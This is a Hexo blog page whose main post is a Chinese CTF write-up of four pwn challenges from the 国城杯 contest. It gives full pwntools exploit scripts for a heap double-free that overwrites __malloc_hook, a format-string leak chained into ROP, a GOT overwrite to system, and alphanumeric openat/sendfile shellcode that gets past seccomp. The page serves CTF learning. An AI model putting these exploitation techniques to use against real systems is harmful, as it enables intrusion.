<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">[object Object]</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-国城杯pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AFpwn/" class="article-date">
  <time class="dt-published" datetime="2024-12-09T06:33:31.754Z" itemprop="datePublished">2024-12-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a><strong>vtable_hijack</strong></h2><p>使用ida打开一看发现基本什么漏洞都有了，算签到堆吧，最近正好学习了一下堆，没想到真给我做出来了，虽然比较基础，但还是非常开心。、</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>from struct import pack<br>from ctypes import *<br>from LibcSearcher import *<br>from pwn import *<br>context(arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>#context(arch&#x3D;’i386’,log_level&#x3D;’debug’)<br>def s(a):<br>    io.send(a)</p>
<p>def sa(a, b):<br>    io.sendafter(a, b)</p>
<p>def sl(a):<br>    io.sendline(a)</p>
<p>def sla(a, b):<br>    io.sendlineafter(a, b)</p>
<p>def r():<br>    io.recv()</p>
<p>def pr():<br>    print(io.recv())</p>
<p>def rl(a):<br>    return io.recvuntil(a)</p>
<p>def inter():<br>    io.interactive()</p>
<p>def debug():<br>    gdb.attach(io)<br>    pause()</p>
<p>def get_addr():<br>    return u64(io.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))</p>
<p>def ret_csu(r12, r13, r14, r15, last):<br>    payload &#x3D; offset * ‘a’<br>    #构造栈溢出的padding<br>    payload +&#x3D; p64(gadget1)<br>    #gadgets1的地址<br>    payload +&#x3D; p64(0) + p64(1)<br>    #rbx&#x3D;0, rbp&#x3D;1<br>    payload +&#x3D; p64(r12)<br>    #call调用的地址<br>    payload +&#x3D; p64(r13) + p64(r14) + p64(r15)<br>    #三个参数的寄存器<br>    payload +&#x3D; p64(gadget2)<br>    #gadgets2的地址<br>    payload +&#x3D; ‘a’ * 56<br>    #pop出的padding<br>    payload +&#x3D; p64(last)<br>    #函数最后的返回地址<br>    return payload</p>
<p>io&#x3D;process(‘.&#x2F;pwn’)<br>#io&#x3D;remote(‘’,)<br>elf&#x3D;ELF(‘.&#x2F;pwn’)<br>libc&#x3D;ELF(‘.&#x2F;libc.so.6’)<br>def choose(num):<br>    sla(b’choice:’,str(num))</p>
<p>def add(idx,size):<br>    choose(1)<br>    sla(b’index:’,str(idx))<br>    sla(b’size:’,str(size))</p>
<p>def free(idx):<br>    choose(2)<br>    sla(b’index:’,str(idx))</p>
<p>def show(idx):<br>    choose(4)<br>    sla(b’index:’,str(idx))</p>
<p>def edit(idx,content):<br>    choose(3)<br>    sla(b’index:’,str(idx))<br>    sla(b’length:’,str(len(content)))<br>    sla(b’content:’,content)</p>
<p>add(0,0x410)<br>add(1,0x10)<br>free(0)<br>show(0)<br>libc_base&#x3D;u64(io.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))-0x39BB78<br>print(hex(libc_base))<br>ogg&#x3D;[0x3f3e6,0x3f43a,0xd5c07]<br>malloc_hook&#x3D;libc_base+libc.sym[‘__malloc_hook’]<br>add(0,0x10)<br>add(1,0x10)<br>add(2,0x10)<br>payload&#x3D;b’a’*0x10+p64(0)+p64(0x21)+p64(malloc_hook-0x23)<br>one&#x3D;libc_base+ogg[2]<br>add(0,0x68)<br>add(1,0x68)<br>free(0)<br>free(1)<br>free(0)<br>add(2,0x68)#2<br>edit(2,p64(malloc_hook-0x23))<br>add(3,0x68)<br>add(4,0x68)<br>add(5,0x68)<br>edit(5,b’a’*0x13+p64(one))<br>add(6,0x20)<br>print(hex(one))<br>#debug()<br>inter()</p>
<h2 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a><strong>Offensive_Security</strong></h2><p>本题一共三个要点，先来看第一个。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209144350560.png" alt="image-20241209144350560"></p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209144427415.png" alt="image-20241209144427415"></p>
<p>本题给了两个文件，有一个是作者自己写的libc库，所以要结合起来看。</p>
<p>这里我们首先看第一张图片。</p>
<p>首先进入Login函数，我们看到用到调用password，这里确定password是一个固定值。然后进入login函数查看具体功能。</p>
<p>可以看到这里是存在一个格式化字符串漏洞的，也就是说我们可以利用它来泄露我们想要的内容，这里恰巧password的地址给出了，那我们需要如何利用来进行泄露？这里我本人是忘记了相关的做法，后来也是看辉神的解法才想起来的。</p>
<p>这里我们调试看看</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209145120718.png" alt="image-20241209145120718"></p>
<p>我们在格式化字符串处输入aaaaaaaabbbbbbb来看看，可以看到我们输入的地方，然后看一下大概是栈上的第几个参数</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209145246668.png" alt="image-20241209145246668"></p>
<p>因该分别对应第8第9，也就是说，我们现在能控制两个参数，这里我们必须要指向0x6002b0时才能泄露出来password，那么我们在利用格式化字符串的时候将0x6002b0写入这两个参数中的任意一个再在剩下的一个字长中利用%s来泄露就可以泄露出正确的password。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209145647896.png" alt="image-20241209145647896"></p>
<p>进入到下一步：</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209145720090.png" alt="image-20241209145720090"></p>
<p>这里pthrea_create没见过，没有关系，查一下：</p>
<p><code>pthread_create</code> 是一个用于创建新线程的函数，属于 POSIX 线程（pthreads）库的一部分。在多线程编程中使用该函数可以启动一个新的线程来执行指定的函数。</p>
<p>也就是说现在这里出现的checker和guess函数属于同时进行的多线程函数。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209151731084.png" alt="image-20241209151731084"></p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209151741845.png" alt="image-20241209151741845"></p>
<p>这里checker主要功能就是检查authentication_code的位置上存放的内容是否为1，用户输入的内容是否为1，然后检查v1是否等于a_c，而guess的功能是检测输入并保存进a_c的内容是否为1。也就是说我在guess函数时输入1就会将a_c修改为1，然后再次输入1即可通过检测。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209152243985.png" alt="image-20241209152243985"></p>
<p>然后第三步就是主要考点。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209153638586.png" alt="image-20241209153638586"></p>
<p>此时我们已经进入shell函数，第一眼看过去感觉就是ret2libc，但是没有给Libc(其实也可以打，就是麻烦)。到这里就卡住了，也是在辉神的指导下，才知道了真正的考点。<img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209153811010.png" alt="image-20241209153811010"></p>
<p>看到汇编里有小惊喜。都是没见过的gadget，搜索一下吧。</p>
<ol>
<li><p><strong>在地址 0x40064E 处的代码片段：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xlat</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>xlat</code></strong>: 这条指令用于根据查找表对 AL 寄存器中的字节进行转换。查找表由 DS:(E)BX 寄存器指向。它将 AL 中的字节替换为查找表中的对应字节。</li>
<li><strong><code>retn</code></strong>: 返回指令，从堆栈中弹出返回地址，并将控制转移到该地址。</li>
</ul>
</li>
<li><p><strong>在地址 0x400650 处的代码片段：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop     rdx</span><br><span class="line">pop     rcx</span><br><span class="line">add     rcx, 0D093h</span><br><span class="line">bextr   rbx, rcx, rdx</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>pop rdx</code></strong>: 从堆栈弹出一个值到 <code>rdx</code> 寄存器。</li>
<li><strong><code>pop rcx</code></strong>: 从堆栈弹出一个值到 <code>rcx</code> 寄存器。</li>
<li><strong><code>add rcx, 0D093h</code></strong>: 将立即数 <code>0D093h</code>（十进制是 33427）加到 <code>rcx</code> 寄存器中。</li>
<li><strong><code>bextr rbx, rcx, rdx</code></strong>: 位域提取（BEXTR）指令，从 <code>rcx</code> 中提取由 <code>rdx</code> 指定的位域，并将结果存入 <code>rbx</code> 中。</li>
<li><strong><code>retn</code></strong>: 返回指令，恢复之前的指令指针。</li>
</ul>
</li>
<li><p><strong>在地址 0x40065F 处的代码片段：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stosb</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>stosb</code></strong>: 该指令将 AL 寄存器中的字节存储到由 RDI 寄存器指向的内存位置，然后根据方向标志（如果清除则递增）来递增或递减 RDI。</li>
<li><strong><code>retn</code></strong>: 返回指令，从堆栈中弹出返回地址并返回。</li>
</ul>
</li>
</ol>
<p>大致意思：</p>
<p>xlat:将rbx的内容赋值给al。</p>
<p>bextr：假设：</p>
<ul>
<li><code>rcx</code> 的值是 <code>0b110101010101</code> （一个二进制数），</li>
<li><code>rdx</code> 的值是 <code>0x0408</code>，其中 <code>0x08</code> 表示从第 8 位开始（从 0 开始数），<code>0x04</code> 表示提取 4 位。</li>
</ul>
<p>那么 <code>bextr rbx, rcx, rdx</code> 将会从 <code>rcx</code> 的第 8 位开始提取 4 位，结果为 <code>0b0101</code>，并将其放入 <code>rbx</code>。</p>
<p>就是根据给出的rcx,rdx控制rbx的值</p>
<p>stosb：将al中的内容赋值给rdi递增或递减rdi</p>
<p>这里我们现在能通过这三个gadget控制rbx-&gt;al-&gt;rdi。</p>
<p>并且这题其实有基本原题的题目存在，并且找到了相关文章。</p>
<p><a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=938527f1-03c4-4349-8110-5510f7d4b84a#6-fluff">https://www.kn0sky.com/?p=938527f1-03c4-4349-8110-5510f7d4b84a#6-fluff</a></p>
<p>修改一下相应的地址就可以打通。</p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><p>from pwn import *<br>from LibcSearcher import *<br>import ctypes<br>context(arch&#x3D;’amd64’,log_level&#x3D;’debug’,os&#x3D;’linux’)<br>io&#x3D;process(‘.&#x2F;attachment’)<br>elf&#x3D;ELF(‘.&#x2F;attachment’)<br>password&#x3D;0x6002b0<br>payload&#x3D;b’%9$saaab’+p64(password)<br>io.sendafter(b’Username:’,payload)<br>#gdb.attach(io)<br>pause()<br>io.recvuntil(b’Welcome, \n’)<br>pwd&#x3D;u64(io.recv(8))<br>print(hex(pwd))<br>io.sendafter(b’password: ‘,p64(pwd))<br>io.sendlineafter(b’[!] Guess the authentication code?’,b’1’)<br>io.sendlineafter(b’[!] Please enter your authentication code: \n’,b’1’)<br>pause()<br>pop_rdi_ret &#x3D; 0x400661       # : pop rdi ; ret<br>stosb_rdi_al_ret &#x3D; 0x40065F   # : stosb byte ptr [rdi], al ; ret<br>xlatb_ret &#x3D; 0x40064E          # : xlat ; ret<br>bextr_ret &#x3D; 0x400650<br>gdb.attach(io)<br>pause()<br>padding &#x3D; b’A’ * 0x28</p>
<p>buffer &#x3D; 0x000000000600900<br>printer&#x3D;0x400647</p>
<p>def set_rbx(b:int):<br>    p &#x3D; b””<br>    p +&#x3D; pack(bextr_ret)<br>    p +&#x3D; pack(0x4000)<br>    p +&#x3D; pack(b - 0x0D093)<br>    return p</p>
<p>def set_al(a:bytes,offset:int):<br>    tmp &#x3D; next(elf.search(a)) - offset<br>    #print(hex(tmp))<br>    p &#x3D; pack(xlatb_ret)<br>    return set_rbx(tmp) + p</p>
<p>is_first &#x3D; True<br>def save_al(val:bytes,offset:int):<br>    global is_first<br>    p &#x3D; b””<br>    if is_first:<br>        p +&#x3D; pack(pop_rdi_ret)<br>        p +&#x3D; pack(buffer)<br>        is_first &#x3D; False<br>    p +&#x3D; pack(stosb_rdi_al_ret)<br>    return set_al(val,offset) + p</p>
<p>def write_str(s:bytes):<br>    p&#x3D;b””<br>    last_al &#x3D; 0x0<br>    for i in s:<br>        p +&#x3D; save_al(p8(i),last_al)<br>        last_al &#x3D; i<br>    return p</p>
<p>payload &#x3D; write_str(b”flag.txt”)<br>payload +&#x3D; pack(pop_rdi_ret)<br>payload +&#x3D; pack(buffer)<br>payload +&#x3D; pack(printer)</p>
<p>io.sendline(padding + payload)</p>
<p>io.interactive()</p>
<p>有空可以研究一下，但感觉主要还是学习gadgets的功能，如果后面再有类似的题目直接套模板大概率都是直接出。</p>
<h2 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a><strong>beverage store</strong></h2><p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209193245041.png" alt="image-20241209193245041"></p>
<p>随机数绕过。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209193333840.png" alt="image-20241209193333840"></p>
<p>一个选择，主要目的是最终修改的地方以及内容。还可以用来泄露。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209193417820.png" alt="image-20241209193417820"></p>
<p>还给了&#x2F;bin&#x2F;sh，这里其实已经可以想到要修改got表了。</p>
<p>注意上面的选择没有限制是否就可以输入负数，也就是说可以向上修改任意值。<img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241209193553739.png" alt="image-20241209193553739"></p>
<p>上面正好就是got表。但是自己做的时候没往上翻，也没找到，明明已经想到咋做了（qaq）只能说对文件内容存放的位置不熟悉。</p>
<p>接下来就是泄露地址计算system然后覆盖了。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p>from struct import pack<br>import ctypes<br>from LibcSearcher import *<br>from pwn import *<br>context(arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>#context(arch&#x3D;’i386’,log_level&#x3D;’debug’)<br>def s(a):<br>    io.send(a)</p>
<p>def sa(a, b):<br>    io.sendafter(a, b)</p>
<p>def sl(a):<br>    io.sendline(a)</p>
<p>def sla(a, b):<br>    io.sendlineafter(a, b)</p>
<p>def r():<br>    io.recv()</p>
<p>def pr():<br>    print(io.recv())</p>
<p>def rl(a):<br>    return io.recvuntil(a)</p>
<p>def inter():<br>    io.interactive()</p>
<p>def debug():<br>    gdb.attach(io)<br>    pause()</p>
<p>def get_addr():<br>    return u64(io.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))</p>
<p>def ret_csu(r12, r13, r14, r15, last):<br>    payload &#x3D; offset * ‘a’<br>    #构造栈溢出的padding<br>    payload +&#x3D; p64(gadget1)<br>    #gadgets1的地址<br>    payload +&#x3D; p64(0) + p64(1)<br>    #rbx&#x3D;0, rbp&#x3D;1<br>    payload +&#x3D; p64(r12)<br>    #call调用的地址<br>    payload +&#x3D; p64(r13) + p64(r14) + p64(r15)<br>    #三个参数的寄存器<br>    payload +&#x3D; p64(gadget2)<br>    #gadgets2的地址<br>    payload +&#x3D; ‘a’ * 56<br>    #pop出的padding<br>    payload +&#x3D; p64(last)<br>    #函数最后的返回地址<br>    return payload</p>
<p>io&#x3D;process(‘.&#x2F;pwn’)</p>
<p>#io&#x3D;remote(‘’,)<br>elf&#x3D;ELF(‘.&#x2F;pwn’)<br>libc&#x3D;ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)<br>printf&#x3D;elf.sym[‘printf’]<br>libcc&#x3D;ctypes.CDLL(‘libc.so.6’)<br>seed&#x3D;libcc.time(0)<br>libcc.srand(seed)<br>v1&#x3D;libcc.rand()<br>sla(b’id’,p64(printf))<br>sla(b’code:’,str(v1))<br>#gdb.attach(io)<br>#pause()<br>sla(b’wine\n’,b’-4’)<br>sla(b’choose\n’,p64(0x40133B))<br>sla(b’wine\n’,b’-5’)<br>sa(b’choose\n’,b’aaaaaaaa’)<br>rl(b’aaaaaaaa’)<br>scanf&#x3D;u64(io.recv(6).ljust(8,b’\x00’))<br>print(hex(scanf))<br>libc_base&#x3D;scanf-libc.sym[‘__isoc99_scanf’]<br>system&#x3D;libc_base+libc.sym[‘system’]<br>print(hex(libc_base))<br>print(hex(system))<br>sla(b’wine\n’,b’-7’)<br>s(p64(system))<br>sla(b’wine\n’,b’-4’)<br>sa(b’choose\n’,p64(0x401511))<br>debug()<br>inter()</p>
<p>这里一定要注意在修改地址的时候一定一定要用sa，不然会破坏结构导致乱跳。浪费了很多时间。（注”这里我用的本地环境打的，当时题目环境给错了）</p>
<h2 id="alpha-shell"><a href="#alpha-shell" class="headerlink" title="alpha_shell"></a>alpha_shell</h2><p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210192740270.png" alt="image-20241210192740270"></p>
<p>这里直接用ida打开发现是这样的并且没有main函数，f5没反应，咋回事捏？</p>
<p>在辉神的指导下才知道有花指令，就不细讲了，那是re✌要干的事。大致看一下特征吧<img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210192857852.png" alt="image-20241210192857852"></p>
<p>那么我们现在来去花。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210192924307.png" alt="image-20241210192924307"></p>
<p>将jz一行nop将jnz改为jmp，点击main,然后按下p重新检测函数即可。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210193021227.png" alt="image-20241210193021227"></p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210193036501.png" alt="image-20241210193036501"></p>
<p>这题还有沙箱，虽然熟练了就知道沙箱ban了哪些函数但是有工具为啥不用捏。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210193123096.png" alt="image-20241210193123096"></p>
<p>然后又遇到问题了，发现这里我们seccomp出不来，这是这么回事？前两个出现回显Invalid…这是因为我在发送数据时使用了回车（\n）导致函数检测没通过，后面的from…是因为我直接ctrl+c了。问了辉神之后才知道用ctrl+d就好了。作用是：<img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210193333794.png" alt="image-20241210193333794"></p>
<p>哎，跟着辉神总是能学到新知识啊。</p>
<p><img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210193406013.png" alt="image-20241210193406013"></p>
<p>这里可以看到常规的orw用不了了，但是没禁用openat和sendfile。</p>
<p>这里有点忘记区别了搜一下吧。</p>
<h3 id="readv-函数"><a href="#readv-函数" class="headerlink" title="readv 函数"></a><code>readv</code> 函数</h3><ul>
<li><p><strong>功能</strong>：<code>readv</code> 用于从文件描述符读取数据到多个缓冲区中。</p>
</li>
<li><p>原型</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t readv(int fd, const struct iovec *iov, int iovcnt);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数</p>
<p>：</p>
<ul>
<li><code>fd</code>：要读取的文件描述符。</li>
<li><code>iov</code>：指向一个<code>iovec</code>结构数组，该数组每个元素包含一个缓冲区指针和大小。</li>
<li><code>iovcnt</code>：<code>iov</code>数组的元素个数。</li>
</ul>
</li>
<li><p><strong>返回值</strong>：成功时返回读取的字节数，失败时返回-1并设置<code>errno</code>。</p>
</li>
</ul>
<h3 id="openat-函数"><a href="#openat-函数" class="headerlink" title="openat 函数"></a><code>openat</code> 函数</h3><ul>
<li><p><strong>功能</strong>：<code>openat</code> 用于打开相对于某个目录文件描述符的文件。</p>
</li>
<li><p>原型</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int openat(int dirfd, const char *pathname, int flags, mode_t mode);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数</p>
<p>：</p>
<ul>
<li><code>dirfd</code>：目录文件描述符，可以是<code>AT_FDCWD</code>（表示当前工作目录）。</li>
<li><code>pathname</code>：要打开的文件路径。</li>
<li><code>flags</code>：打开模式标志，如<code>O_RDONLY</code>、<code>O_WRONLY</code>。</li>
<li><code>mode</code>：用于指定文件权限（在创建时使用）。</li>
</ul>
</li>
<li><p><strong>返回值</strong>：成功时返回新文件描述符，失败时返回-1并设置<code>errno</code>。</p>
</li>
</ul>
<h3 id="execveat-函数"><a href="#execveat-函数" class="headerlink" title="execveat 函数"></a><code>execveat</code> 函数</h3><ul>
<li><p><strong>功能</strong>：<code>execveat</code> 用于执行相对于某个目录文件描述符的可执行文件。</p>
</li>
<li><p>原型</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数</p>
<p>：</p>
<ul>
<li><code>dirfd</code>：目录文件描述符。</li>
<li><code>pathname</code>：可执行文件路径。</li>
<li><code>argv</code>：传递给新程序的参数。</li>
<li><code>envp</code>：传递给新程序的环境变量。</li>
<li><code>flags</code>：执行标志，可以是0或<code>AT_EMPTY_PATH</code>（允许路径为空）。</li>
</ul>
</li>
<li><p><strong>返回值</strong>：成功执行时不会返回，失败时返回-1并设置<code>errno</code>。</p>
</li>
</ul>
<h3 id="sendfile-函数"><a href="#sendfile-函数" class="headerlink" title="sendfile 函数"></a><code>sendfile</code> 函数</h3><ul>
<li><p><strong>功能</strong>：<code>sendfile</code> 用于在文件描述符之间发送文件数据，通常用于在文件和套接字之间传输数据。</p>
</li>
<li><p>原型</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数</p>
<p>：</p>
<ul>
<li><code>out_fd</code>：目标文件描述符（通常是套接字）。</li>
<li><code>in_fd</code>：源文件描述符（通常是文件）。</li>
<li><code>offset</code>：偏移量指针，从源文件的何处开始读取，可以为<code>NULL</code>。</li>
<li><code>count</code>：要发送的字节数。</li>
</ul>
</li>
<li><p><strong>返回值</strong>：成功时返回传输的字节数，失败时返回-1并设置<code>errno</code>。</p>
</li>
</ul>
<p>还有要注意<img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210202524079.png" alt="image-20241210202524079"></p>
<p>意思是shellcode中不能有数字，必须时纯字符。这是后我们就要写纯字符shellcode了，还真是没用过。</p>
<p>这里要用到ae64这个工具了，能够生成纯字符shellcode。</p>
<p>并且还有小细节<img src="C:\Users\21753\AppData\Roaming\Typora\typora-user-images\image-20241210202840347.png" alt="image-20241210202840347"></p>
<p>这里最后是call rdx因为我们的shellcode都从rdx开始。</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><p>from struct import pack<br>from ctypes import *<br>from LibcSearcher import *<br>from pwn import *<br>from ae64 import AE64<br>context(arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>#context(arch&#x3D;’i386’,log_level&#x3D;’debug’)<br>def s(a):<br>    io.send(a)</p>
<p>def sa(a, b):<br>    io.sendafter(a, b)</p>
<p>def sl(a):<br>    io.sendline(a)</p>
<p>def sla(a, b):<br>    io.sendlineafter(a, b)</p>
<p>def r():<br>    io.recv()</p>
<p>def pr():<br>    print(io.recv())</p>
<p>def rl(a):<br>    return io.recvuntil(a)</p>
<p>def inter():<br>    io.interactive()</p>
<p>def debug():<br>    gdb.attach(io)<br>    pause()</p>
<p>def get_addr():<br>    return u64(io.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))</p>
<p>def ret_csu(r12, r13, r14, r15, last):<br>    payload &#x3D; offset * ‘a’<br>    #构造栈溢出的padding<br>    payload +&#x3D; p64(gadget1)<br>    #gadgets1的地址<br>    payload +&#x3D; p64(0) + p64(1)<br>    #rbx&#x3D;0, rbp&#x3D;1<br>    payload +&#x3D; p64(r12)<br>    #call调用的地址<br>    payload +&#x3D; p64(r13) + p64(r14) + p64(r15)<br>    #三个参数的寄存器<br>    payload +&#x3D; p64(gadget2)<br>    #gadgets2的地址<br>    payload +&#x3D; ‘a’ * 56<br>    #pop出的padding<br>    payload +&#x3D; p64(last)<br>    #函数最后的返回地址<br>    return payload</p>
<p>io&#x3D;process(‘.&#x2F;pwn’)<br>#io&#x3D;remote(‘’,)<br>elf&#x3D;ELF(‘.&#x2F;pwn’)<br>#libc&#x3D;ELF(‘.&#x2F;libc.so.6’)<br>openat&#x3D;shellcraft.openat(-100,’flag’,0)<br>sendfile&#x3D;shellcraft.sendfile(1,3,0,50)<br>payload&#x3D;asm(openat)+asm(sendfile)<br>payload&#x3D;AE64().encode(payload,”rdx”)<br>print(payload)<br>io.send(payload)<br>inter()</p>
<p>国城杯又学到很多东西，啥时候能像辉神一样ak就好了qaq。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AFpwn/" data-id="cm4ifzn3q0000743ab2nl5wi4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/12/08/hello-world/" class="article-date">
  <time class="dt-published" datetime="2024-12-08T12:01:05.825Z" itemprop="datePublished">2024-12-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/12/08/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
